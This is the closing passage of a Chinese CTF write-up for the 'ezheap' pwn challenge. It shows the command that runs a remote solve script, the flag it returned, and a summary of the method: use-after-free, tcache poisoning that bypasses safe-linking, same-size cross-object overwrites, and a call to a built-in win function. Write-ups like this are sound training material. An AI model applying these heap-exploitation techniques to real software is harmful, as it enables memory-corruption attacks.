wsl python3 /mnt/c/Users/WYH/Desktop/polarisctf招新赛/pwn/ezheap/solve.py REMOTE=1 SKIP_PROBE=1
```

远程输出：

```text
[audit] snapshot: polarisctf{04177abb-521c-4bb2-9b0d-b5ebdd141273}
```

---

## 十、这题的关键点

这题看起来是普通菜单堆题，但实际上有 4 个很容易做错的点：

1. 不是拿 shell，而是调用程序内置的 `audit_sink`。
2. `Patch session metadata` 不是普通逻辑漏洞，而是 safe-linking 下的 tcache poisoning 原语。
3. 不能只 free 一个 session，因为 tcache `count` 会归零，poison 后的目标 chunk 取不出来。
4. `Dispatch async task` 检查的不是 `task->ctx[8]`，而是 `queue_ctrl+0x8`。

把这 4 个点都理顺，这题就会从“复杂 C++ 堆题”变成一个非常规整的两段式 tcache poisoning。

---

## 十一、总结

本题的本质可以概括成一句话：

> 利用 session 的 UAF + recycled-session patch 实现 safe-linking 下的 tcache poisoning，再借助同尺寸的 worker profile 跨类型覆盖 `queue_ctrl` 和 `task descriptor`，最终调用程序内置 `audit_sink` 读出 flag。

如果要给这题贴标签，我会写：

- `UAF`
- `tcache poisoning`
- `safe-linking bypass`
- `same-size cross-object reuse`
- `internal win function reuse`
